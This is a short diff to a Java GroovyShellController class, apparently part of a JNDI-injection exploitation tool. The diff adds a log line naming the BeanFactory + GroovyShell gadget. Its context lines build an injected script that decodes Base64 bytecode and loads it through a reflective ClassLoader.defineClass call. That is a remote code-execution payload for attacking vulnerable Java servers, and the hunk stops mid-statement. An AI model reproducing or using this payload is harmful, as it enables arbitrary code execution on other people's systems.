@@ -13,6 +13,8 @@ import java.util.Base64;
 public class GroovyShellController extends BasicController {
     @Override
     public Object process(byte[] byteCode) {
+        System.out.println("[Reference] Factory: BeanFactory + GroovyShell");
+
         String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(byteCode) + "');" +
                 "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                 "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
